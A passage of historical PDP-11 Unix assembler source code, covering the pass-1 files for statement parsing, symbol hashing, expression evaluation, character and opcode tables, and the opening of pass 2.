	tst	(r5)+
2:
	rts	r5

putw:
	tst	ifflg
	beq	1f
	cmp	r4,$'\n
	bne	2f
1:
	mov	r4,*obufp
	add	$2,obufp
	cmp	obufp,$outbuf+512.
	blo	2f
	mov	$outbuf,obufp
	movb	pof,r0
	sys	write; outbuf; 512.
2:
	rts	pc

-- /usr/source/as/as13.s mode=0100664 uid=3 gid=3 atime=174922115 mtime=174844074 --
/
/

/ a3 -- pdp-11 assembler pass 1

assem:
	jsr	pc,readop
	jsr	pc,checkeos
		br ealoop
	tst	ifflg
	beq	3f
	cmp	r4,$200
	blos	assem
	cmpb	(r4),$21	/if
	bne	2f
	inc	ifflg
2:
	cmpb	(r4),$22   /endif
	bne	assem
	dec	ifflg
	br	assem
3:
	mov	r4,-(sp)
	jsr	pc,readop
	cmp	r4,$'=
	beq	4f
	cmp	r4,$':
	beq	1f
	mov	r4,savop
	mov	(sp)+,r4
	jsr	pc,opline
	br	ealoop
1:
	mov	(sp)+,r4
	cmp	r4,$200
	bhis	1f
	cmp	r4,$1		/ digit
	beq	3f
	jsr	r5,error; 'x
	br	assem
1:
	bitb	$37,(r4)
	beq	1f
	jsr	r5,error; 'm
1:
	bisb	dot-2,(r4)
	mov	dot,2(r4)
	br	assem
3:
	mov	numval,r0
	jsr	pc,fbcheck
	movb	dotrel,curfbr(r0)
	asl	r0
	movb	dotrel,nxtfb
	mov	dot,nxtfb+2
	movb	r0,nxtfb+1
	mov	dot,curfb(r0)
	movb	fbfil,r0
	sys	write; nxtfb; 4
	br	assem
4:
	jsr	pc,readop
	jsr	pc,expres
	mov	(sp)+,r1
	cmp	r1,$200
	bhis	1f
	jsr	r5,error; 'x
	br	ealoop
1:
	cmp	r1,$dotrel
	bne	2f
	bic	$40,r3
	cmp	r3,dotrel
	bne	1f
2:
	bicb	$37,(r1)
	bic	$!37,r3
	bne	2f
	clr	r2
2:
	bisb	r3,(r1)
	mov	r2,2(r1)
	br	ealoop
1:
	jsr	r5,error; '.
	movb	$2,dotrel
ealoop:
	cmp	r4,$';
	beq	assem1
	cmp	r4,$'\n
	bne	1f
	inc	line
	br	assem1
1:
	cmp	r4,$'\e
	bne	2f
	tst	ifflg
	beq	1f
	jsr	r5,error; 'x
1:
	rts	pc
2:
	jsr	r5,error; 'x
2:
	jsr	pc,checkeos
		br assem1
	jsr	pc,readop
	br	2b
assem1:
	jmp	assem

fbcheck:
	cmp	r0,$9.
	bhi	1f
	rts	pc
1:
	jsr	r5,error; 'f
	clr	r0
	rts	pc

checkeos:
	cmp	r4,$'\n
	beq	1f
	cmp	r4,$';
	beq	1f
	cmp	r4,$'\e
	beq	1f
	add	$2,(sp)
1:
	rts	pc

-- /usr/source/as/as14.s mode=0100664 uid=3 gid=3 atime=174922115 mtime=174844078 --
/
/

/ a4 -- pdp-11 assembler pass1

rname:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	$8,r5
	mov	$symbol+8.,r2
	clr	-(r2)
	clr	-(r2)
	clr	-(r2)
	clr	-(r2)
	clr	-(sp)
	clr	-(sp)
	cmp	r0,$'~		/  symbol not for hash table
	bne	1f
	inc	2(sp)
	clr	ch
1:
	jsr	pc,rch
	movb	chartab(r0),r3
	ble	1f
	add	r3,(sp)
	swab	(sp)
	dec	r5
	blt	1b
	movb	r3,(r2)+
	br	1b
1:
	mov	r0,ch
	mov	(sp)+,r1
	clr	r0
	tst	(sp)+
	beq	1f
	mov	symend,r4
	br	4f
1:
	div	$hshsiz,r0
	ashc	$1,r0
	add	$hshtab,r1
1:
	sub	r0,r1
	cmp	r1,$hshtab
	bhi	2f
	add	$2*hshsiz,r1
2:
	mov	$symbol,r2
	mov	-(r1),r4
	beq	3f
	cmp	(r2)+,(r4)+
	bne	1b
	cmp	(r2)+,(r4)+
	bne	1b
	cmp	(r2)+,(r4)+
	bne	1b
	cmp	(r2)+,(r4)+
	bne	1b
	br	1f
3:
	mov	symend,r4
	mov	r4,(r1)
4:
	mov	$symbol,r2
	mov	r4,-(sp)
	add	$20,r4
	cmp	r4,0f
	blos	4f
	add	$512.,0f
	sys	indir; 9f
	.data
9:	sys	break; 0:end
	.text
4:
	mov	(sp)+,r4
	mov	(r2)+,(r4)+
	mov	(r2)+,(r4)+
	mov	(r2)+,(r4)+
	mov	(r2)+,(r4)+
	clr	(r4)+
	clr	(r4)+
	mov	r4,symend
	sub	$4,r4
1:
	mov	r4,-(sp)
	mov	r4,r3
	sub	$8,r3
	cmp	r3,$usymtab
	blo	1f
	sub	$usymtab,r3
	clr	r2
	div	$3,r2
	mov	r2,r4
	add	$4000,r4		/ user symbol
	br	2f
1:
	sub	$symtab,r3
	clr	r2
	div	$3,r2
	mov	r2,r4
	add	$1000,r4		/ builtin symbol
2:
	jsr	pc,putw
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	tst	(sp)+
	rts	pc

number:
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r5,-(sp)
	clr	r1
	clr	r5
1:
	jsr	pc,rch
	jsr	r5,betwen; '0; '9
		br 1f
	sub	$'0,r0
	mpy	$10.,r5
	add	r0,r5
	als	$3,r1
	add	r0,r1
	br	1b
1:
	cmp	r0,$'b
	beq	1f
	cmp	r0,$'f
	beq	1f
	cmp	r0,$'.
	bne	2f
	mov	r5,r1
	clr	r0
2:
	movb	r0,ch
	mov	r1,r0
	mov	(sp)+,r5
	mov	(sp)+,r3
	mov	(sp)+,r2
	rts	pc
1:
	mov	r0,r3
	mov	r5,r0
	jsr	pc,fbcheck
	add	$141,r0
	cmp	r3,$'b
	beq	1f
	add	$10.,r0
1:
	mov	r0,r4
	mov	(sp)+,r5
	mov	(sp)+,r3
	mov	(sp)+,r2
	add	$2,(sp)
	rts	pc

rch:
	movb	ch,r0
	beq	1f
	clrb	ch
	rts	pc
1:
	dec	inbfcnt
	blt	2f
	movb	*inbfp,r0
	inc	inbfp
	bic	$!177,r0
	beq	1b
	rts	pc
2:
	movb	fin,r0
	beq	3f
	sys	read; inbuf;512.
	bcs	2f
	tst	r0
	beq	2f
	mov	r0,inbfcnt
	mov	$inbuf,inbfp
	br	1b
2:
	movb	fin,r0
	clrb	fin
	sys	close
3:
	decb	nargs
	bgt	2f
	mov	$'\e,r0
	rts	pc
2:
	tst	ifflg
	beq	2f
	jsr	r5,error; 'i
	jmp	aexit
2:
	mov	curarg,r0
	tst	(r0)+
	mov	(r0),0f
	mov	r0,curarg
	incb	fileflg
	sys	indir; 9f
	.data
9:	sys	open; 0:0; 0
	.text
	bec	2f
	mov	0b,r0
	jsr	r5,filerr; <?\n>
	jmp	 aexit
2:
	movb	r0,fin
	mov	$1,line
	mov	r4,-(sp)
	mov	r1,-(sp)
	mov	$5,r4
	jsr	pc,putw
	mov	*curarg,r1
2:
	movb	(r1)+,r4
	beq	2f
	jsr	pc,putw
	br	2b
2:
	mov	$-1,r4
	jsr	pc,putw
	mov	(sp)+,r1
	mov	(sp)+,r4
	br	1b

-- /usr/source/as/as15.s mode=0100664 uid=3 gid=3 atime=174922115 mtime=174844082 --
/
/

/ a5 -- pdp-11 assembler pass 1

readop:
	mov	savop,r4
	beq	1f
	clr	savop
	rts	pc
1:
	jsr	pc,8f
	jsr	pc,putw
	rts	pc

8:
	jsr	pc,rch
_readop:
	mov	r0,r4
	movb	chartab(r0),r1
	bgt	rdname
	jmp	*1f-2(r1)

	fixor
	escp
	8b
	retread
	dquote
	garb
	squote
	rdname
	skip
	rdnum
	retread
	string
1:

escp:
	jsr	pc,rch
	mov	$esctab,r1
1:
	cmpb	r0,(r1)+
	beq	1f
	tstb	(r1)+
	bne	1b
	rts	pc
1:
	movb	(r1),r4
	rts	pc

esctab:
	.byte '/, '/
	.byte '\<, 035
	.byte '>, 036
	.byte '%, 037
	.byte 0, 0

fixor:
	mov	$037,r4
retread:
	rts	pc

rdname:
	movb	r0,ch
	cmp	r1,$'0
	blo	1f
	cmp	r1,$'9
	blos	rdnum
1:
	jmp	rname

rdnum:
	jsr	pc,number
		br 1f
	rts	pc

squote:
	jsr	pc,rsch
	br	1f
dquote:
	jsr	pc,rsch
	mov	r0,-(sp)
	jsr	pc,rsch
	swab	r0
	bis	(sp)+,r0
1:
	mov	r0,numval
	mov	$1,r4
	jsr	pc,putw
	mov	numval,r4
	jsr	pc,putw
	mov	$1,r4
	tst	(sp)+
	rts	pc

skip:
	jsr	pc,rch
	mov	r0,r4
	cmp	r0,$'\e
	beq	1f
	cmp	r0,$'\n
	bne	skip
1:
	rts	pc

garb:
	jsr	r5,error; 'g
	br	8b

string:
	mov	$'<,r4
	jsr	pc,putw
	clr	numval
1:
	jsr	pc,rsch
	tst	r1
	bne	1f
	mov	r0,r4
	bis	$400,r4
	jsr	pc,putw
	inc	 numval
	br	1b
1:
	mov	$-1,r4
	jsr	pc,putw
	mov	$'<,r4
	tst	(sp)+
	rts	pc

rsch:
	jsr	pc,rch
	cmp	r0,$'\e
	beq	4f
	cmp	r0,$'\n
	beq	4f
	clr	r1
	cmp	r0,$'\\
	bne	3f
	jsr	pc,rch
	mov	$schar,r2
1:
	cmpb	(r2)+,r0
	beq	2f
	tstb	(r2)+
	bpl	1b
	rts	pc
2:
	movb	(r2)+,r0
	clr	r1
	rts	pc
3:
	cmp	r0,$'>
	bne	1f
	inc	r1
1:
	rts	pc
4:
	jsr	r5,error; '<
	jmp	aexit

schar:
	.byte 'n, 012
	.byte 't, 011
	.byte 'e, 004
	.byte '0, 000
	.byte 'r, 015
	.byte 'a, 006
	.byte 'p, 033
	.byte 0,  -1

-- /usr/source/as/as16.s mode=0100664 uid=3 gid=3 atime=174922116 mtime=174844086 --
/
/

/ a6 -- pdp-11 assembler pass 1

opline:
	mov	r4,r0
	jsr	r5,betwen; 0; 200
		br	1f
	cmp	r0,$'<
	bne	xpr
	jmp	opl17
xpr:
	jsr	pc,expres
	add	$2,dot
	rts	pc
1:
	movb	(r4),r0
	cmp	r0,$24
	beq	xpr
	jsr	r5,betwen; 5; 36
		br xpr
	mov	r0,-(sp)
	jsr	pc,readop
	mov	(sp)+,r0
	asl	r0
	jmp	*1f-12(r0)

1:
	opl13	/ map fop freg,fdst to double
	opl6
	opl7
	opl10
	opl11
	opl13	/ map fld/fst to double
	opl13
	opl13	/ map fop fsrc,freg to double
	opl15
	opl16
	opl17
	opl20
	opl21
	opl22
	opl23
	xpr
	opl25
	opl26
	opl27
	opl13  / map mul s,r to double
	opl31
	opl32
	xpr
	xpr
	opl35
	opl36

/ jbr
opl35:
	mov	$4,-(sp)
	br	1f

/ jeq, etc
opl36:
	mov	$6,-(sp)
1:
	jsr	pc,expres
	cmp	r3,dotrel
	bne	1f
	sub	dot,r2
	bge	1f
	cmp	r2,$-376
	blt	1f
	mov	$2,(sp)
1:
	add	(sp)+,dot
	rts	pc

/double
opl13:
opl7:
	jsr	pc,addres
op2:
	cmp	r4,$',
	beq	1f
	jsr	pc,errora
	rts	pc
1:
	jsr	pc,readop
opl15:   / single operand
	jsr	pc,addres
	add	$2,dot
	rts	pc

opl31:	/ sob
	jsr	pc,expres
	cmp	r4,$',
	beq	1f
	jsr	pc,errora
1:
	jsr	pc,readop

/branch
opl6:
opl10:
opl11:
	jsr	pc,expres
	add	$2,dot
	rts	pc

/ .byte
opl16:
	jsr	pc,expres
	inc	dot
	cmp	r4,$',
	bne	1f
	jsr	pc,readop
	br	opl16
1:
	rts	pc

/ < (.ascii)
opl17:
	add	numval,dot
	jsr	pc,readop
	rts	pc

/.even
opl20:
	inc	dot
	bic	$1,dot
	rts	pc

/.if
opl21:
	jsr	pc,expres
	tst	r3
	bne	1f
	jsr	r5,error; 'U
1:
	tst	r2
	bne	opl22
	inc	ifflg
opl22:	/endif
	rts	pc

/.globl
opl23:
	cmp	r4,$200
	blo	1f
	bisb	$40,(r4)
	jsr	pc,readop
	cmp	r4,$',
	bne	1f
	jsr	pc,readop
	br	opl23
1:
	rts	pc

opl25:
opl26:
opl27:
	mov	dotrel,r1
	asl	r1
	mov	dot,savdot-4(r1)
	mov	savdot-[2*25](r0),dot
	asr	r0
	sub	$25-2,r0
	mov	r0,dotrel
	rts	pc

/ .common
opl32:
	cmp	r4,$200
	blo	1f
	bis	$40,(r4)
	jsr	pc,readop
	cmp	r4,$',
	bne	1f
	jsr	pc,readop
	jsr	pc,expres
	rts	pc
1:
	jsr	r5,error; 'x
	rts	pc

addres:
	cmp	r4,$'(
	beq	alp
	cmp	r4,$'-
	beq	amin
	cmp	r4,$'$
	beq	adoll
	cmp	r4,$'*
	beq	astar
getx:
	jsr	pc,expres
	cmp	r4,$'(
	bne	2f
	jsr	pc,readop
	jsr	pc,expres
	jsr	pc,checkreg
	jsr	pc,checkrp
	add	$2,dot
	clr	r0
	rts	pc
2:
	cmp	r3,$24		/ register type
	bne	1f
	jsr	pc,checkreg
	clr	r0
	rts	pc
1:
	add	$2,dot
	clr	r0
	rts	pc

alp:
	jsr	pc,readop
	jsr	pc,expres
	jsr	pc,checkrp
	jsr	pc,checkreg
	cmp	r4,$'+
	bne	1f
	jsr	pc,readop
	clr	r0
	rts	pc
1:
	mov	$2,r0
	rts	pc

amin:
	jsr	pc,readop
	cmp	r4,$'(
	beq	1f
	mov	r4,savop
	mov	$'-,r4
	br	getx
1:
	jsr	pc,readop
	jsr	pc,expres
	jsr	pc,checkrp
	jsr	pc,checkreg
	clr	r0
	rts	pc

adoll:
	jsr	pc,readop
	jsr	pc,expres
	add	$2,dot
	clr	r0
	rts	pc

astar:
	jsr	pc,readop
	cmp	r4,$'*
	bne	1f
	jsr	r5,error; '*
1:
	jsr	pc,addres
	add	r0,dot
	rts	pc

errora:
	jsr	r5,error; 'a
	rts	pc

checkreg:
	cmp	r2,$7
	bhi	1f
	cmp	r3,$1
	beq	2f
	cmp	r3,$4
	bhi	2f
1:
	jsr	pc,errora
2:
	rts	pc

errore:
	jsr	r5,error; 'e
	rts	pc

checkrp:
	cmp	r4,$')
	beq	1f
	jsr	r5,error; ')
	rts	pc
1:
	jsr	pc,readop
	rts	pc

-- /usr/source/as/as17.s mode=0100664 uid=3 gid=3 atime=174920354 mtime=174844091 --
/
/

/  a7 -- pdp-11 assembler pass 1

expres:
	mov	r5,-(sp)
	mov	$'+,-(sp)
	clr	opfound
	clr	r2
	mov	$1,r3
	br	1f
advanc:
	jsr	pc,readop
1:
	mov	r4,r0
	jsr	r5,betwen; 0; 177
		br .+4
	br	7f
	movb	(r4),r0
	mov	2(r4),r1
	br	oprand
7:
	cmp	r4,$141
	blo	1f
	cmp	r4,$141+10.
	bhis	2f
	movb	curfbr-141(r4),r0
	asl	r4
	mov	curfb-[2*141](r4),r2
	bpl	oprand
	jsr	r5,error; 'f
	br	oprand
2:
	clr	r3
	clr	r2
	br	oprand
1:
	mov	$esw1,r1
1:
	cmp	(r1)+,r4
	beq	1f
	tst	(r1)+
	bne	1b
	tst	opfound
	bne	2f
	jsr	pc,errore
2:
	tst	(sp)+
	mov	(sp)+,r5
	rts	pc
1:
	jmp	*(r1)

esw1:
	'+;	binop
	'-;	binop
	'*;	binop
	'/;	binop
	'&;	binop
	037;	binop
	035;	binop
	036;	binop
	'%;	binop
	'[;	brack
	'^;	binop
	1;	exnum
	'!;	binop
	0;	0

binop:
	cmpb	(sp),$'+
	beq	1f
	jsr	pc,errore
1:
	movb	r4,(sp)
	br	advanc

exnum:
	mov	numval,r1
	mov	$1,r0
	br	oprand

brack:
	mov	r2,-(sp)
	mov	r3,-(sp)
	jsr	pc,readop
	jsr	pc,expres
	cmp	r4,$']
	beq	1f
	jsr	r5,error; ']
1:
	mov	r3,r0
	mov	r2,r1
	mov	(sp)+,r3
	mov	(sp)+,r2

oprand:
	inc	opfound
	mov	$exsw2,r5
1:
	cmp	(sp),(r5)+
	beq	1f
	tst	(r5)+
	bne	1b
	br	eoprnd
1:
	jmp	*(r5)

exsw2:
	'+; exadd
	'-; exsub
	'*; exmul
	'/; exdiv
	037; exor
	'&; exand
	035;exlsh
	036;exrsh
	'%; exmod
	'!; exnot
	'^; excmbin
	0;  0

excmbin:
	mov	r0,r3			/ give left flag of right
	br	eoprnd

exrsh:
	neg	r1
	beq	exlsh
	inc	r1
	clc
	ror	r2
exlsh:
	jsr	r5,combin; 0
	als	r1,r2
	br	eoprnd

exmod:
	jsr	r5,combin; 0
	mov	r1,-(sp)
	mov	r2,r1
	clr	r0
	dvd	(sp)+,r0
	mov	r1,r2
	br	eoprnd

exadd:
	jsr	r5,combin; 0
	add	r1,r2
	br	eoprnd

exsub:
	jsr	r5,combin; 1
	sub	r1,r2
	br	eoprnd

exand:
	jsr	r5,combin; 0
	com	r1
	bic	r1,r2
	br	eoprnd

exor:
	jsr	r5,combin; 0
	bis	r1,r2
	br	eoprnd

exmul:
	jsr	r5,combin; 0
	mpy	r2,r1
	mov	r1,r2
	br	eoprnd

exdiv:
	jsr	r5,combin; 0
	mov	r1,-(sp)
	mov	r2,r1
	clr	r0
	dvd	(sp)+,r0
	mov	r0,r2
	br	eoprnd

exnot:
	jsr	r5,combin; 0
	com	r1
	add	r1,r2
	br	eoprnd

eoprnd:
	mov	$'+,(sp)
	jmp	advanc

combin:
	mov	r0,-(sp)
	bis	r3,(sp)
	bic	$!40,(sp)
	bic	$!37,r0
	bic	$!37,r3
	cmp	r0,r3
	ble	1f
	mov	r0,-(sp)
	mov	r3,r0
	mov	(sp)+,r3
1:
	tst	r0
	beq	1f
	tst	(r5)+
	beq	2f
	cmp	r0,r3
	bne	2f
	mov	$1,r3
	br	2f
1:
	tst	(r5)+
	clr	r3
2:
	bis	(sp)+,r3
	rts	r5

-- /usr/source/as/as18.s mode=0100664 uid=3 gid=3 atime=174920355 mtime=174844095 --
/
/

/ a8 -- pdp-11 assembler pass 1

chartab:
	.byte -14,-14,-14,-14,-02,-14,-14,-14
	.byte -14,-22, -2,-14,-14,-22,-14,-14
	.byte -14,-14,-14,-14,-14,-14,-14,-14
	.byte -14,-14,-14,-14,-14,-14,-14,-14
	.byte -22,-20,-16,-14,-20,-20,-20,-12
	.byte -20,-20,-20,-20,-20,-20,056,-06
	.byte 060,061,062,063,064,065,066,067
	.byte 070,071,-20,-02,-00,-20,-14,-14
	.byte -14,101,102,103,104,105,106,107
	.byte 110,111,112,113,114,115,116,117
	.byte 120,121,122,123,124,125,126,127
	.byte 130,131,132,-20,-24,-20,-20,137
	.byte -14,141,142,143,144,145,146,147
	.byte 150,151,152,153,154,155,156,157
	.byte 160,161,162,163,164,165,166,167
	.byte 170,171,172,-14,-26,-14,176,-14

.data

namedone:.byte 0
a.tmp1:	</tmp/atm1a\0>
a.tmp2:	</tmp/atm2a\0>
a.tmp3:	</tmp/atm3a\0>
	.even
curfb:
	-1;-1;-1;-1;-1;-1;-1;-1;-1;-1
obufp:	outbuf
symend:	usymtab

.bss
curfbr:	.=.+10.
savdot:	.=.+6
bufcnt:	.=.+2
hshsiz = 1553.
hshtab:	.=2*hshsiz+.
pof:	.=.+1
wordf:	.=.+1
fin:	.=.+1
fbfil:	.=.+1
fileflg:.=.+1
errflg:	.=.+1
ch:	.=.+1
.even
symbol:	.=.+8.
obufc:	.=.+2
outbuf:	.=.+512.
line:	.=.+2
inbfcnt:.=.+2
ifflg:	.=.+2
inbfp:	.=.+2
nargs:	.=.+2
curarg:	.=.+2
opfound:.=.+2
savop:	.=.+2
numval:	.=.+2
nxtfb:	.=.+4
usymtab:.=.+36.
end:
.text
-- /usr/source/as/as19.s mode=0110664 uid=3 gid=3 atime=174920355 mtime=174844101 --
/
/

/ a9 -- pdp-11 assembler pass 1

eae = 0

/ key to types

/	0	undefined
/	1	absolute
/	2	text
/	3	data
/	4	bss
/	5	flop freg,dst (movfo, = stcfd)
/	6	branch
/	7	jsr
/	10	rts
/	11	sys
/	12	movf (=ldf,stf)
/	13	double operand (mov)
/	14	flop fsrc,freg (addf)
/	15	single operand (clr)
/	16	.byte
/	17	string (.ascii, "<")
/	20	.even
/	21	.if
/	22	.endif
/	23	.globl
/	24	register
/	25	.text
/	26	.data
/	27	.bss
/	30	mul,div, etc
/	31	sob
/	32	.comm
/	33	estimated text
/	34	estimated data
/	35	jbr
/	36	jeq, jne, etc

	.data
symtab:
/ special variables

<.\0\0\0\0\0\0\0>; dotrel:02; dot:000000
<..\0\0\0\0\0\0>;	01; dotdot:000000

/ register

<r0\0\0\0\0\0\0>;	24;000000
<r1\0\0\0\0\0\0>;	24;000001
<r2\0\0\0\0\0\0>;	24;000002
<r3\0\0\0\0\0\0>;	24;000003
<r4\0\0\0\0\0\0>;	24;000004
<r5\0\0\0\0\0\0>;	24;000005
<sp\0\0\0\0\0\0>;	24;000006
<pc\0\0\0\0\0\0>;	24;000007

.if eae

/eae & switches

<csw\0\0\0\0\0>;	01;177570
<div\0\0\0\0\0>;	01;177300
<ac\0\0\0\0\0\0>;	01;177302
<mq\0\0\0\0\0\0>;	01;177304
<mul\0\0\0\0\0>;	01;177306
<sc\0\0\0\0\0\0>;	01;177310
<sr\0\0\0\0\0\0>;	01;177311
<nor\0\0\0\0\0>;	01;177312
<lsh\0\0\0\0\0>;	01;177314
<ash\0\0\0\0\0>;	01;177316

.endif

/ system calls

<exit\0\0\0\0>;		01;0000001
<fork\0\0\0\0>;		01;0000002
<read\0\0\0\0>;		01;0000003
<write\0\0\0>;		01;0000004
<open\0\0\0\0>;		01;0000005
<close\0\0\0>;		01;0000006
<wait\0\0\0\0>;		01;0000007
<creat\0\0\0>;		01;0000010
<link\0\0\0\0>;		01;0000011
<unlink\0\0>;		01;0000012
<exec\0\0\0\0>;		01;0000013
<chdir\0\0\0>;		01;0000014
<time\0\0\0\0>;		01;0000015
<makdir\0\0>;		01;0000016
<chmod\0\0\0>;		01;0000017
<chown\0\0\0>;		01;0000020
<break\0\0\0>;		01;0000021
<stat\0\0\0\0>;		01;0000022
<seek\0\0\0\0>;		01;0000023
<tell\0\0\0\0>;		01;0000024
<mount\0\0\0>;		01;0000025
<umount\0\0>;		01;0000026
<setuid\0\0>;		01;0000027
<getuid\0\0>;		01;0000030
<stime\0\0\0>;		01;0000031
<fstat\0\0\0>;		01;0000034
<mdate\0\0\0>;		01;0000036
<stty\0\0\0\0>;		01;0000037
<gtty\0\0\0\0>;		01;0000040
<nice\0\0\0\0>;		01;0000042
<signal\0\0>;		01;0000060

/ double operand

<mov\0\0\0\0\0>;	13;0010000
<movb\0\0\0\0>;		13;0110000
<cmp\0\0\0\0\0>;	13;0020000
<cmpb\0\0\0\0>;		13;0120000
<bit\0\0\0\0\0>;	13;0030000
<bitb\0\0\0\0>;		13;0130000
<bic\0\0\0\0\0>;	13;0040000
<bicb\0\0\0\0>;		13;0140000
<bis\0\0\0\0\0>;	13;0050000
<bisb\0\0\0\0>;		13;0150000
<add\0\0\0\0\0>;	13;0060000
<sub\0\0\0\0\0>;	13;0160000

/ branch

<br\0\0\0\0\0\0>;	06;0000400
<bne\0\0\0\0\0>;	06;0001000
<beq\0\0\0\0\0>;	06;0001400
<bge\0\0\0\0\0>;	06;0002000
<blt\0\0\0\0\0>;	06;0002400
<bgt\0\0\0\0\0>;	06;0003000
<ble\0\0\0\0\0>;	06;0003400
<bpl\0\0\0\0\0>;	06;0100000
<bmi\0\0\0\0\0>;	06;0100400
<bhi\0\0\0\0\0>;	06;0101000
<blos\0\0\0\0>;		06;0101400
<bvc\0\0\0\0\0>;	06;0102000
<bvs\0\0\0\0\0>;	06;0102400
<bhis\0\0\0\0>;		06;0103000
<bec\0\0\0\0\0>;	06;0103000
<bcc\0\0\0\0\0>;	06;0103000
<blo\0\0\0\0\0>;	06;0103400
<bcs\0\0\0\0\0>;	06;0103400
<bes\0\0\0\0\0>;	06;0103400

/ jump/branch type

<jbr\0\0\0\0\0>;	35;0000400
<jne\0\0\0\0\0>;	36;0001000
<jeq\0\0\0\0\0>;	36;0001400
<jge\0\0\0\0\0>;	36;0002000
<jlt\0\0\0\0\0>;	36;0002400
<jgt\0\0\0\0\0>;	36;0003000
<jle\0\0\0\0\0>;	36;0003400
<jpl\0\0\0\0\0>;	36;0100000
<jmi\0\0\0\0\0>;	36;0100400
<jhi\0\0\0\0\0>;	36;0101000
<jlos\0\0\0\0>;		36;0101400
<jvc\0\0\0\0\0>;	36;0102000
<jvs\0\0\0\0\0>;	36;0102400
<jhis\0\0\0\0>;		36;0103000
<jec\0\0\0\0\0>;	36;0103000
<jcc\0\0\0\0\0>;	36;0103000
<jlo\0\0\0\0\0>;	36;0103400
<jcs\0\0\0\0\0>;	36;0103400
<jes\0\0\0\0\0>;	36;0103400

/ single operand

<clr\0\0\0\0\0>;	15;0005000
<clrb\0\0\0\0>;		15;0105000
<com\0\0\0\0\0>;	15;0005100
<comb\0\0\0\0>;		15;0105100
<inc\0\0\0\0\0>;	15;0005200
<incb\0\0\0\0>;		15;0105200
<dec\0\0\0\0\0>;	15;0005300
<decb\0\0\0\0>;		15;0105300
<neg\0\0\0\0\0>;	15;0005400
<negb\0\0\0\0>;		15;0105400
<adc\0\0\0\0\0>;	15;0005500
<adcb\0\0\0\0>;		15;0105500
<sbc\0\0\0\0\0>;	15;0005600
<sbcb\0\0\0\0>;		15;0105600
<tst\0\0\0\0\0>;	15;0005700
<tstb\0\0\0\0>;		15;0105700
<ror\0\0\0\0\0>;	15;0006000
<rorb\0\0\0\0>;		15;0106000
<rol\0\0\0\0\0>;	15;0006100
<rolb\0\0\0\0>;		15;0106100
<asr\0\0\0\0\0>;	15;0006200
<asrb\0\0\0\0>;		15;0106200
<asl\0\0\0\0\0>;	15;0006300
<aslb\0\0\0\0>;		15;0106300
<jmp\0\0\0\0\0>;	15;0000100
<swab\0\0\0\0>;		15;0000300

/ jsr

<jsr\0\0\0\0\0>;	07;0004000

/ rts

<rts\0\0\0\0\0>;	010;000200

/ simple operand

<sys\0\0\0\0\0>;	011;104400

/ flag-setting

<clc\0\0\0\0\0>;	01;0000241
<clv\0\0\0\0\0>;	01;0000242
<clz\0\0\0\0\0>;	01;0000244
<cln\0\0\0\0\0>;	01;0000250
<sec\0\0\0\0\0>;	01;0000261
<sev\0\0\0\0\0>;	01;0000262
<sez\0\0\0\0\0>;	01;0000264
<sen\0\0\0\0\0>;	01;0000270

/ floating point ops

<cfcc\0\0\0\0>;		01;170000
<setf\0\0\0\0>;		01;170001
<setd\0\0\0\0>;		01;170011
<seti\0\0\0\0>;		01;170002
<setl\0\0\0\0>;		01;170012
<clrf\0\0\0\0>;		15;170400
<negf\0\0\0\0>;		15;170700
<absf\0\0\0\0>;		15;170600
<tstf\0\0\0\0>;		15;170500
<movf\0\0\0\0>;		12;172400
<movif\0\0\0>;		14;177000
<movfi\0\0\0>;		05;175400
<movof\0\0\0>;		14;177400
<movfo\0\0\0>;		05;176000
<addf\0\0\0\0>;		14;172000
<subf\0\0\0\0>;		14;173000
<mulf\0\0\0\0>;		14;171000
<divf\0\0\0\0>;		14;174400
<cmpf\0\0\0\0>;		14;173400
<modf\0\0\0\0>;		14;171400
<movie\0\0\0>;		14;176400
<movei\0\0\0>;		05;175000
<ldfps\0\0\0>;		15;170100
<stfps\0\0\0>;		15;170200
<fr0\0\0\0\0\0>;	24;000000
<fr1\0\0\0\0\0>;	24;000001
<fr2\0\0\0\0\0>;	24;000002
<fr3\0\0\0\0\0>;	24;000003
<fr4\0\0\0\0\0>;	24;000004
<fr5\0\0\0\0\0>;	24;000005

/ 11/45 operations

<als\0\0\0\0\0>;	30;072000
<alsc\0\0\0\0>;		30;073000
<mpy\0\0\0\0\0>;	30;070000
.if eae-1
<mul\0\0\0\0\0>;	30;070000
<div\0\0\0\0\0>;	30;071000
<ash\0\0\0\0\0>;	30;072000
<ashc\0\0\0\0>;		30;073000
.endif
<dvd\0\0\0\0\0>;	30;071000
<xor\0\0\0\0\0>;	07;074000
<sxt\0\0\0\0\0>;	15;006700
<mark\0\0\0\0>;		11;006400
<sob\0\0\0\0\0>;	31;077000

/ specials

<.byte\0\0\0>;		16;000000
<.even\0\0\0>;		20;000000
<.if\0\0\0\0\0>;	21;000000
<.endif\0\0>;		22;000000
<.globl\0\0>;		23;000000
<.text\0\0\0>;		25;000000
<.data\0\0\0>;		26;000000
<.bss\0\0\0\0>;		27;000000
<.comm\0\0\0>;		32;000000

ebsymtab:


start:
	sys	signal; 2; 1
	ror	r0
	bcs	1f
	sys	signal; 2; aexit
1:
	mov	sp,r5
	mov	(r5)+,r0
	cmpb	*2(r5),$'-
	bne	1f
	tst	(r5)+
	dec	r0
	br	2f
1:
	clr	unglob
2:
	movb	r0,nargs
	mov	r5,curarg
	jsr	r5,fcreat; a.tmp1
	movb	r0,pof
	jsr	r5,fcreat; a.tmp2
	movb	r0,fbfil
	jsr	pc,setup
	jmp	go

setup:
	mov	$symtab,r1
1:
	clr	r3
	mov	$8,r2
	mov	r1,-(sp)
2:
	movb	(r1)+,r4
	beq	2f
	add	r4,r3
	swab	r3
	sob	r2,2b
2:
	clr	r2
	div	$hshsiz,r2
	ashc	$1,r2
	add	$hshtab,r3
4:
	sub	r2,r3
	cmp	r3,$hshtab
	bhi	3f
	add	$2*hshsiz,r3
3:
	tst	-(r3)
	bne	4b
	mov	(sp)+,r1
	mov	r1,(r3)
	add	$12.,r1
	cmp	r1,$ebsymtab
	blo	1b
	rts	pc

/overlay buffer
inbuf	= setup
.	=inbuf+512.

-- /usr/source/as/as21.s mode=0100664 uid=3 gid=3 atime=174920363 mtime=174844106 --
/
/

/ a21 -- pdp-11 assembler pass 2 

indir	= 0

main:
	sys	signal; 2; 1
	ror	r0
	bcs	1f
	sys	signal; 2; aexit
1:
	jmp	start

/ set up sizes and origins

go:

/ read in symbol table

	mov	$usymtab,r1
1:
	jsr	pc,getw
